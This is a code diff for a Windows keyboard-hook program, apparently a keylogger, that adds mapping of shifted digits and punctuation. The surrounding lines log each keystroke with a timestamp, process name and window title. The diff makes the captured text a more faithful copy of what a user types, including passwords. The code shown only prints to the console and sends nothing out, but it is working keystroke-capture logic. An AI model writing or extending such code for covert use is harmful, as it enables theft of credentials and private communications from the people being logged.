@@ -167,6 +167,35 @@ LRESULT CALLBACK _KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 			BOOL makeUpper = (capsLockOn ^ shiftPressed);
 			key[0] = makeUpper ? _totupper(key[0]) : _totlower(key[0]);
 		}
+		else if (_tcslen(key) == 1 && (_istdigit(key[0]) || _istpunct(key[0]))) {
+			BOOL shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+			if (shiftPressed) {
+				// Map shifted characters
+				switch (key[0]) {
+				case '1': key[0] = '!'; break;
+				case '2': key[0] = '@'; break;
+				case '3': key[0] = '#'; break;
+				case '4': key[0] = '$'; break;
+				case '5': key[0] = '%'; break;
+				case '6': key[0] = '^'; break;
+				case '7': key[0] = '&'; break;
+				case '8': key[0] = '*'; break;
+				case '9': key[0] = '('; break;
+				case '0': key[0] = ')'; break;
+				case '-': key[0] = '_'; break;
+				case '=': key[0] = '+'; break;
+				case '[': key[0] = '{'; break;
+				case ']': key[0] = '}'; break;
+				case '\\': key[0] = '|'; break;
+				case ';': key[0] = ':'; break;
+				case '\'': key[0] = '"'; break;
+				case ',': key[0] = '<'; break;
+				case '.': key[0] = '>'; break;
+				case '/': key[0] = '?'; break;
+				case '`': key[0] = '~'; break;
+				}
+			}
+		}
 
 		_tprintf(TEXT("[%s] [%-*s] [%-*s]: %s\n"), ts, (int)_tcslen(lastProcessName), lastProcessName, (int)_tcslen(lastWindowTitle), lastWindowTitle, key);
 	}
